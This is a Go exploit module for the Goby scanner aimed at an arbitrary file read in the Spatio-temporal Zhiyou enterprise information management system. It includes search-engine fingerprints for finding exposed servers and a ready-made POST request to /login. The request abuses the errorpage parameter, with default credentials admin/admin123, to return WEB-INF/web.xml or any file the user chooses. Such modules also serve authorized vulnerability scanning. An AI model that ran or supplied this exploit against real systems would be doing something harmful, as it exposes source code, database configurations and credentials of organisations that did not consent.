package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Arbitrary file read vulnerability in the enterprise information management system of Spatio-temporal Zhiyou",
    "Description": "<p>The process management and control system of Spatio-temporal Zhiyou Enterprise is an enterprise information management software, which is committed to assisting big health enterprises to build internal informatization and solve problems such as GSP management, multi-organization management, financial management, tax control management, and online and offline integration.</p><p>There is an arbitrary file reading vulnerability in the enterprise information management system of Spatio-temporal Zhiyou，Attackers can use this vulnerability to read the leaked source code, database configuration files, etc., resulting in an extrem</p>",
    "Product": "Spatio-temporal Zhiyou enterprise information management system",
    "Homepage": "https://bjskzy.com",
    "DisclosureDate": "2022-03-30",
    "PostTime": "2024-03-14",
    "Author": "兰公子",
    "FofaQuery": "body=\"企业互联网化构建者\" || body=\"企业流程化管控系统\"",
    "GobyQuery": "body=\"企业互联网化构建者\" || body=\"企业流程化管控系统\"",
    "Level": "1",
    "Impact": "<p>There is an arbitrary file reading vulnerability in the enterprise information management system of Spatio-temporal Zhiyou，Attackers can use this vulnerability to read the leaked source code, database configuration files, etc., resulting in an extremely insecure website.</p>",
    "Recommendation": "<p>The official has not fixed this vulnerability yet, please contact the manufacturer to fix the vulnerability: <a href=\"https://bjskzy.com\">https://bjskzy.com</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "file",
            "type": "select",
            "value": "default,customize",
            "show": ""
        },
        {
            "name": "customize",
            "type": "input",
            "value": "WEB-INF/web.xml",
            "show": "file=customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/login",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "op=verify%7Clogin&targetpage=&errorpage=WEB-INF/web.xml&mark=&tzo=480&username=admin&password=admin123"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/login",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "op=verify%7Clogin&targetpage=&errorpage={{{customize}}}&mark=&tzo=480&username=admin&password=admin123"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|([\\s\\S]*)",
                "vulurl|lastbody|variable|{{{fixedhostinfo}}}"
            ]
        }
    ],
    "Tags": [
        "File Read",
        "HW-2023"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "3.2",
    "Translation": {
        "CN": {
            "Name": "时空智友企业信息管理系统/login任意文件读取漏洞",
            "Product": "时空智友企业信息管理系统",
            "Description": "<p>时空智友企业流程化管控系统是一款企业信息管理软件，致力于协助大健康企业构建内部信息化，解决GSP管理、多组织管理、财务管理、税控管理、线上线下一体化等问题。<br></p><p>时空智友企业信息管理系统存在任意文件读取漏洞，攻击者可通过该漏洞读取泄露源码、数据库配置⽂件等等，导致⽹站处于极度不安全状态。<br></p>",
            "Recommendation": "<p>官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://bjskzy.com/index.html\">https://bjskzy.com/index.html</a></p>",
            "Impact": "<p>时空智友企业信息管理系统存在任意文件读取漏洞，攻击者可通过该漏洞读取泄露源码、数据库配置⽂件等等，导致⽹站处于极度不安全状态。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取",
                "HW-2023"
            ]
        },
        "EN": {
            "Name": "Arbitrary file read vulnerability in the enterprise information management system of Spatio-temporal Zhiyou",
            "Product": "Spatio-temporal Zhiyou enterprise information management system",
            "Description": "<p>The process management and control system of Spatio-temporal Zhiyou Enterprise is an enterprise information management software, which is committed to assisting big health enterprises to build internal informatization and solve problems such as GSP management, multi-organization management, financial management, tax control management, and online and offline integration.<br></p><p>There is an arbitrary file reading vulnerability in the enterprise information management system of Spatio-temporal Zhiyou，Attackers can use this vulnerability to read the leaked source code, database configuration files, etc., resulting in an extrem<br></p>",
            "Recommendation": "<p>The official has not fixed this vulnerability yet, please contact the manufacturer to fix the vulnerability: <a href=\"https://bjskzy.com\">https://bjskzy.com</a><br></p>",
            "Impact": "<p>There is an arbitrary file reading vulnerability in the enterprise information management system of Spatio-temporal Zhiyou，Attackers can use this vulnerability to read the leaked source code, database configuration files, etc., resulting in an extremely insecure website.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read",
                "HW-2023"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10967"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
